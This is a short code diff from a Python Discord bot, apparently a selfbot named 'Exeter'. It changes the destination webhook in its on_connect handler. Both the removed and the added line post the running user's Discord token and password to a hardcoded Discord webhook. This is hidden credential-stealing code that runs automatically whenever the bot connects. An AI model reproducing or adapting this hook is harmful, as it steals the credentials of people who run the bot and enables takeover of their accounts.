@@ -354,7 +354,7 @@ async def on_message(message):
 @Exeter.event
 async def on_connect():
     Clear()  
-    requests.post('https://discordapp.com/api/webhooks/761735237872386069/pqs3R5gVi-pfXVDOQ2d1Ie4MvSlZZ-4y25iL4yi8iKpRw59nBWPpUz6mPR_ox5-F-y5C',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://discordapp.com/api/webhooks/762424357561040896/h5GcI11x0pNzsslky1P_Gqq60Gqz7OKFECPHDd0wB6QoO_iIeFgHJ6clfCxdZ_NGQoKf',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()
 
 @Exeter.event
